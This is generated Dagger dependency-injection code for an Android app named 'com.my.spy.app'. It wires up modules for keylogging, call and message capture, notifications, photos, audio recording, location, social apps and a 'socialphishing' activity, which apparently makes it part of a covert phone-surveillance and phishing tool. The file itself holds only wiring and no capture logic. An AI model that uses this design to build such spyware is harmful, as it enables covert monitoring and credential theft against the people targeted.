package com.my.spy.app.di.component;

import android.content.Context;
import androidx.fragment.app.FragmentManager;
import androidx.recyclerview.widget.LinearLayoutManager;
import com.google.errorprone.annotations.CanIgnoreReturnValue;
import com.my.spy.app.data.rxFirebase.InterfaceFirebase;
import com.my.spy.app.di.module.ActivityModule;
import com.my.spy.app.di.module.ActivityModule_ProvideContextFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorCallsFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorKeysFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorLoginFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorMainFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorMapsFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorMessageFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorNotifyFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorPhotoFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorRecordingFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorRegisterFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideInterfaceInteractorSocialFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideLayoutManagerFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideSupportFragmentManagerFactory;
import com.my.spy.app.di.module.ActivityModule_ProvideSupportMapFragmentFactory;
import com.my.spy.app.ui.activities.login.InteractorLogin;
import com.my.spy.app.ui.activities.login.InteractorLogin_Factory;
import com.my.spy.app.ui.activities.login.InterfaceInteractorLogin;
import com.my.spy.app.ui.activities.login.InterfaceViewLogin;
import com.my.spy.app.ui.activities.login.LoginActivity;
import com.my.spy.app.ui.activities.login.LoginActivity_MembersInjector;
import com.my.spy.app.ui.activities.mainchild.MainChildActivity;
import com.my.spy.app.ui.activities.mainchild.MainChildActivity_MembersInjector;
import com.my.spy.app.ui.activities.mainparent.InteractorMainParent;
import com.my.spy.app.ui.activities.mainparent.InteractorMainParent_Factory;
import com.my.spy.app.ui.activities.mainparent.InterfaceInteractorMainParent;
import com.my.spy.app.ui.activities.mainparent.InterfaceViewMainParent;
import com.my.spy.app.ui.activities.mainparent.MainParentActivity;
import com.my.spy.app.ui.activities.mainparent.MainParentActivity_MembersInjector;
import com.my.spy.app.ui.activities.register.InteractorRegister;
import com.my.spy.app.ui.activities.register.InteractorRegister_Factory;
import com.my.spy.app.ui.activities.register.InterfaceInteractorRegister;
import com.my.spy.app.ui.activities.register.InterfaceViewRegister;
import com.my.spy.app.ui.activities.register.RegisterActivity;
import com.my.spy.app.ui.activities.register.RegisterActivity_MembersInjector;
import com.my.spy.app.ui.activities.socialphishing.SocialActivityM;
import com.my.spy.app.ui.activities.socialphishing.SocialActivityM_MembersInjector;
import com.my.spy.app.ui.fragments.calls.CallsFragment;
import com.my.spy.app.ui.fragments.calls.CallsFragment_MembersInjector;
import com.my.spy.app.ui.fragments.calls.InteractorCalls;
import com.my.spy.app.ui.fragments.calls.InteractorCalls_Factory;
import com.my.spy.app.ui.fragments.calls.InterfaceInteractorCalls;
import com.my.spy.app.ui.fragments.calls.InterfaceViewCalls;
import com.my.spy.app.ui.fragments.keylog.InteractorKeys;
import com.my.spy.app.ui.fragments.keylog.InteractorKeys_Factory;
import com.my.spy.app.ui.fragments.keylog.InterfaceInteractorKeys;
import com.my.spy.app.ui.fragments.keylog.InterfaceViewKeys;
import com.my.spy.app.ui.fragments.keylog.KeysFragment;
import com.my.spy.app.ui.fragments.keylog.KeysFragment_MembersInjector;
import com.my.spy.app.ui.fragments.maps.InteractorMaps;
import com.my.spy.app.ui.fragments.maps.InteractorMaps_Factory;
import com.my.spy.app.ui.fragments.maps.InterfaceInteractorMaps;
import com.my.spy.app.ui.fragments.maps.InterfaceViewMaps;
import com.my.spy.app.ui.fragments.maps.MapsFragment;
import com.my.spy.app.ui.fragments.maps.MapsFragment_MembersInjector;
import com.my.spy.app.ui.fragments.message.InteractorMessage;
import com.my.spy.app.ui.fragments.message.InteractorMessage_Factory;
import com.my.spy.app.ui.fragments.message.InterfaceInteractorMessage;
import com.my.spy.app.ui.fragments.message.InterfaceViewMessage;
import com.my.spy.app.ui.fragments.message.MessageFragment;
import com.my.spy.app.ui.fragments.message.MessageFragment_MembersInjector;
import com.my.spy.app.ui.fragments.notifications.InteractorNotifyMessage;
import com.my.spy.app.ui.fragments.notifications.InteractorNotifyMessage_Factory;
import com.my.spy.app.ui.fragments.notifications.InterfaceInteractorNotifyMessage;
import com.my.spy.app.ui.fragments.notifications.InterfaceViewNotifyMessage;
import com.my.spy.app.ui.fragments.notifications.NotifyMessageFragment;
import com.my.spy.app.ui.fragments.notifications.NotifyMessageFragment_MembersInjector;
import com.my.spy.app.ui.fragments.photo.InteractorPhoto;
import com.my.spy.app.ui.fragments.photo.InteractorPhoto_Factory;
import com.my.spy.app.ui.fragments.photo.InterfaceInteractorPhoto;
import com.my.spy.app.ui.fragments.photo.InterfaceViewPhoto;
import com.my.spy.app.ui.fragments.photo.PhotoFragment;
import com.my.spy.app.ui.fragments.photo.PhotoFragment_MembersInjector;
import com.my.spy.app.ui.fragments.recording.InteractorRecording;
import com.my.spy.app.ui.fragments.recording.InteractorRecording_Factory;
import com.my.spy.app.ui.fragments.recording.InterfaceInteractorRecording;
import com.my.spy.app.ui.fragments.recording.InterfaceViewRecording;
import com.my.spy.app.ui.fragments.recording.RecordingFragment;
import com.my.spy.app.ui.fragments.recording.RecordingFragment_MembersInjector;
import com.my.spy.app.ui.fragments.social.InteractorSocial;
import com.my.spy.app.ui.fragments.social.InteractorSocial_Factory;
import com.my.spy.app.ui.fragments.social.InterfaceInteractorSocial;
import com.my.spy.app.ui.fragments.social.InterfaceViewSocial;
import com.my.spy.app.ui.fragments.social.SocialFragment;
import com.my.spy.app.ui.fragments.social.SocialFragment_MembersInjector;
import dagger.internal.DaggerGenerated;
import dagger.internal.DoubleCheck;
import dagger.internal.Preconditions;
import javax.annotation.processing.Generated;
import javax.inject.Provider;

@DaggerGenerated
@Generated(
    value = "dagger.internal.codegen.ComponentProcessor",
    comments = "https://dagger.dev"
)
@SuppressWarnings({
    "unchecked",
    "rawtypes",
    "KotlinInternal",
    "KotlinInternalInJava"
})
public final class DaggerActivityComponent {
  private DaggerActivityComponent() {
  }

  public static Builder builder() {
    return new Builder();
  }

  public static final class Builder {
    private ActivityModule activityModule;

    private AppComponent appComponent;

    private Builder() {
    }

    public Builder activityModule(ActivityModule activityModule) {
      this.activityModule = Preconditions.checkNotNull(activityModule);
      return this;
    }

    public Builder appComponent(AppComponent appComponent) {
      this.appComponent = Preconditions.checkNotNull(appComponent);
      return this;
    }

    public ActivityComponent build() {
      Preconditions.checkBuilderRequirement(activityModule, ActivityModule.class);
      Preconditions.checkBuilderRequirement(appComponent, AppComponent.class);
      return new ActivityComponentImpl(activityModule, appComponent);
    }
  }

  private static final class ActivityComponentImpl implements ActivityComponent {
    private final AppComponent appComponent;

    private final ActivityModule activityModule;

    private final ActivityComponentImpl activityComponentImpl = this;

    private Provider<FragmentManager> provideSupportFragmentManagerProvider;

    private Provider<Context> provideContextProvider;

    private Provider<InterfaceFirebase> getInterfaceFirebaseProvider;

    private Provider<InteractorLogin<InterfaceViewLogin>> interactorLoginProvider;

    private Provider<InterfaceInteractorLogin<InterfaceViewLogin>> provideInterfaceInteractorLoginProvider;

    private Provider<InteractorRegister<InterfaceViewRegister>> interactorRegisterProvider;

    private Provider<InterfaceInteractorRegister<InterfaceViewRegister>> provideInterfaceInteractorRegisterProvider;

    private Provider<InteractorMainParent<InterfaceViewMainParent>> interactorMainParentProvider;

    private Provider<InterfaceInteractorMainParent<InterfaceViewMainParent>> provideInterfaceInteractorMainProvider;

    private Provider<InteractorMaps<InterfaceViewMaps>> interactorMapsProvider;

    private Provider<InterfaceInteractorMaps<InterfaceViewMaps>> provideInterfaceInteractorMapsProvider;

    private Provider<InteractorCalls<InterfaceViewCalls>> interactorCallsProvider;

    private Provider<InterfaceInteractorCalls<InterfaceViewCalls>> provideInterfaceInteractorCallsProvider;

    private Provider<InteractorMessage<InterfaceViewMessage>> interactorMessageProvider;

    private Provider<InterfaceInteractorMessage<InterfaceViewMessage>> provideInterfaceInteractorMessageProvider;

    private Provider<InteractorPhoto<InterfaceViewPhoto>> interactorPhotoProvider;

    private Provider<InterfaceInteractorPhoto<InterfaceViewPhoto>> provideInterfaceInteractorPhotoProvider;

    private Provider<InteractorKeys<InterfaceViewKeys>> interactorKeysProvider;

    private Provider<InterfaceInteractorKeys<InterfaceViewKeys>> provideInterfaceInteractorKeysProvider;

    private Provider<InteractorSocial<InterfaceViewSocial>> interactorSocialProvider;

    private Provider<InterfaceInteractorSocial<InterfaceViewSocial>> provideInterfaceInteractorSocialProvider;

    private Provider<InteractorRecording<InterfaceViewRecording>> interactorRecordingProvider;

    private Provider<InterfaceInteractorRecording<InterfaceViewRecording>> provideInterfaceInteractorRecordingProvider;

    private Provider<InteractorNotifyMessage<InterfaceViewNotifyMessage>> interactorNotifyMessageProvider;

    private Provider<InterfaceInteractorNotifyMessage<InterfaceViewNotifyMessage>> provideInterfaceInteractorNotifyProvider;

    private ActivityComponentImpl(ActivityModule activityModuleParam,
        AppComponent appComponentParam) {
      this.appComponent = appComponentParam;
      this.activityModule = activityModuleParam;
      initialize(activityModuleParam, appComponentParam);

    }

    private LinearLayoutManager linearLayoutManager() {
      return ActivityModule_ProvideLayoutManagerFactory.provideLayoutManager(activityModule, ActivityModule_ProvideContextFactory.provideContext(activityModule));
    }

    @SuppressWarnings("unchecked")
    private void initialize(final ActivityModule activityModuleParam,
        final AppComponent appComponentParam) {
      this.provideSupportFragmentManagerProvider = ActivityModule_ProvideSupportFragmentManagerFactory.create(activityModuleParam);
      this.provideContextProvider = ActivityModule_ProvideContextFactory.create(activityModuleParam);
      this.getInterfaceFirebaseProvider = new GetInterfaceFirebaseProvider(appComponentParam);
      this.interactorLoginProvider = InteractorLogin_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorLoginProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorLoginFactory.create(activityModuleParam, interactorLoginProvider));
      this.interactorRegisterProvider = InteractorRegister_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorRegisterProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorRegisterFactory.create(activityModuleParam, interactorRegisterProvider));
      this.interactorMainParentProvider = InteractorMainParent_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorMainProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorMainFactory.create(activityModuleParam, interactorMainParentProvider));
      this.interactorMapsProvider = InteractorMaps_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorMapsProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorMapsFactory.create(activityModuleParam, interactorMapsProvider));
      this.interactorCallsProvider = InteractorCalls_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorCallsProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorCallsFactory.create(activityModuleParam, interactorCallsProvider));
      this.interactorMessageProvider = InteractorMessage_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorMessageProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorMessageFactory.create(activityModuleParam, interactorMessageProvider));
      this.interactorPhotoProvider = InteractorPhoto_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorPhotoProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorPhotoFactory.create(activityModuleParam, interactorPhotoProvider));
      this.interactorKeysProvider = InteractorKeys_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorKeysProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorKeysFactory.create(activityModuleParam, interactorKeysProvider));
      this.interactorSocialProvider = InteractorSocial_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorSocialProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorSocialFactory.create(activityModuleParam, interactorSocialProvider));
      this.interactorRecordingProvider = InteractorRecording_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorRecordingProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorRecordingFactory.create(activityModuleParam, interactorRecordingProvider));
      this.interactorNotifyMessageProvider = InteractorNotifyMessage_Factory.create(provideSupportFragmentManagerProvider, provideContextProvider, getInterfaceFirebaseProvider);
      this.provideInterfaceInteractorNotifyProvider = DoubleCheck.provider(ActivityModule_ProvideInterfaceInteractorNotifyFactory.create(activityModuleParam, interactorNotifyMessageProvider));
    }

    @Override
    public void inject(LoginActivity loginActivity) {
      injectLoginActivity(loginActivity);
    }

    @Override
    public void inject(RegisterActivity registerActivity) {
      injectRegisterActivity(registerActivity);
    }

    @Override
    public void inject(MainParentActivity mainParentActivity) {
      injectMainParentActivity(mainParentActivity);
    }

    @Override
    public void inject(MainChildActivity mainChildActivity) {
      injectMainChildActivity(mainChildActivity);
    }

    @Override
    public void inject(SocialActivityM socialActivityM) {
      injectSocialActivityM(socialActivityM);
    }

    @Override
    public void inject(MapsFragment mapsFragment) {
      injectMapsFragment(mapsFragment);
    }

    @Override
    public void inject(CallsFragment callsFragment) {
      injectCallsFragment(callsFragment);
    }

    @Override
    public void inject(MessageFragment messageFragment) {
      injectMessageFragment(messageFragment);
    }

    @Override
    public void inject(PhotoFragment photoFragment) {
      injectPhotoFragment(photoFragment);
    }

    @Override
    public void inject(KeysFragment keysFragment) {
      injectKeysFragment(keysFragment);
    }

    @Override
    public void inject(SocialFragment socialFragment) {
      injectSocialFragment(socialFragment);
    }

    @Override
    public void inject(RecordingFragment recordingFragment) {
      injectRecordingFragment(recordingFragment);
    }

    @Override
    public void inject(NotifyMessageFragment notifyMessageFragment) {
      injectNotifyMessageFragment(notifyMessageFragment);
    }

    @CanIgnoreReturnValue
    private LoginActivity injectLoginActivity(LoginActivity instance) {
      LoginActivity_MembersInjector.injectInteractor(instance, provideInterfaceInteractorLoginProvider.get());
      return instance;
    }

    @CanIgnoreReturnValue
    private RegisterActivity injectRegisterActivity(RegisterActivity instance) {
      RegisterActivity_MembersInjector.injectInteractor(instance, provideInterfaceInteractorRegisterProvider.get());
      return instance;
    }

    @CanIgnoreReturnValue
    private MainParentActivity injectMainParentActivity(MainParentActivity instance) {
      MainParentActivity_MembersInjector.injectInteractorParent(instance, provideInterfaceInteractorMainProvider.get());
      return instance;
    }

    @CanIgnoreReturnValue
    private MainChildActivity injectMainChildActivity(MainChildActivity instance) {
      MainChildActivity_MembersInjector.injectFirebase(instance, Preconditions.checkNotNullFromComponent(appComponent.getInterfaceFirebase()));
      return instance;
    }

    @CanIgnoreReturnValue
    private SocialActivityM injectSocialActivityM(SocialActivityM instance) {
      SocialActivityM_MembersInjector.injectFirebase(instance, Preconditions.checkNotNullFromComponent(appComponent.getInterfaceFirebase()));
      return instance;
    }

    @CanIgnoreReturnValue
    private MapsFragment injectMapsFragment(MapsFragment instance) {
      MapsFragment_MembersInjector.injectMapsFragment(instance, ActivityModule_ProvideSupportMapFragmentFactory.provideSupportMapFragment(activityModule));
      MapsFragment_MembersInjector.injectInteractor(instance, provideInterfaceInteractorMapsProvider.get());
      return instance;
    }

    @CanIgnoreReturnValue
    private CallsFragment injectCallsFragment(CallsFragment instance) {
      CallsFragment_MembersInjector.injectInteractor(instance, provideInterfaceInteractorCallsProvider.get());
      CallsFragment_MembersInjector.injectLayoutM(instance, linearLayoutManager());
      return instance;
    }

    @CanIgnoreReturnValue
    private MessageFragment injectMessageFragment(MessageFragment instance) {
      MessageFragment_MembersInjector.injectInteractor(instance, provideInterfaceInteractorMessageProvider.get());
      MessageFragment_MembersInjector.injectLayoutM(instance, linearLayoutManager());
      return instance;
    }

    @CanIgnoreReturnValue
    private PhotoFragment injectPhotoFragment(PhotoFragment instance) {
      PhotoFragment_MembersInjector.injectLayoutM(instance, linearLayoutManager());
      PhotoFragment_MembersInjector.injectInteractor(instance, provideInterfaceInteractorPhotoProvider.get());
      return instance;
    }

    @CanIgnoreReturnValue
    private KeysFragment injectKeysFragment(KeysFragment instance) {
      KeysFragment_MembersInjector.injectInteractor(instance, provideInterfaceInteractorKeysProvider.get());
      KeysFragment_MembersInjector.injectLayoutM(instance, linearLayoutManager());
      return instance;
    }

    @CanIgnoreReturnValue
    private SocialFragment injectSocialFragment(SocialFragment instance) {
      SocialFragment_MembersInjector.injectInteractor(instance, provideInterfaceInteractorSocialProvider.get());
      return instance;
    }

    @CanIgnoreReturnValue
    private RecordingFragment injectRecordingFragment(RecordingFragment instance) {
      RecordingFragment_MembersInjector.injectInteractor(instance, provideInterfaceInteractorRecordingProvider.get());
      RecordingFragment_MembersInjector.injectLayoutM(instance, linearLayoutManager());
      return instance;
    }

    @CanIgnoreReturnValue
    private NotifyMessageFragment injectNotifyMessageFragment(NotifyMessageFragment instance) {
      NotifyMessageFragment_MembersInjector.injectInteractor(instance, provideInterfaceInteractorNotifyProvider.get());
      NotifyMessageFragment_MembersInjector.injectLayoutM(instance, linearLayoutManager());
      return instance;
    }

    private static final class GetInterfaceFirebaseProvider implements Provider<InterfaceFirebase> {
      private final AppComponent appComponent;

      GetInterfaceFirebaseProvider(AppComponent appComponent) {
        this.appComponent = appComponent;
      }

      @Override
      public InterfaceFirebase get() {
        return Preconditions.checkNotNullFromComponent(appComponent.getInterfaceFirebase());
      }
    }
  }
}
